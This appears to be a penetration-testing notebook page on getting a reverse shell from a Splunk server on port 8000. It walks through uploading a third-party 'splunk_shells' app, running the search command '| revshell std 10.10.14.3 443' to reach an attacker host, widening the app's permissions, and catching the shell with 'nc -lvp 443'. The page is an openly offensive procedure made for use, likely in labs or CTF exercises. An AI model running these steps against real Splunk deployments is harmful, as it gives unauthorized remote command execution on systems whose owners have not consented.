# (8000) Splunk

<details>

<summary>Reverse Shell from Splunk</summary>

Download  [https://github.com/TBGSecurity/splunk\_shells/archive/1.2.tar.gz](https://github.com/TBGSecurity/splunk_shells/archive/1.2.tar.gz)

Click on "Search & Reporting"

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

"App: Search & Reporting" --> Manage Apps

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

"Install app from file"

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Upload "splunk\_shells-1.2.tar.gz"

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

"Restart Now"

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Go to "App: Search & Reporting" and use the command: `| revshell std 10.10.14.3 443`

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Click on "Permissions"

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Select "All apps" --> "Save"

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

nc -lvp 443

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

</details>
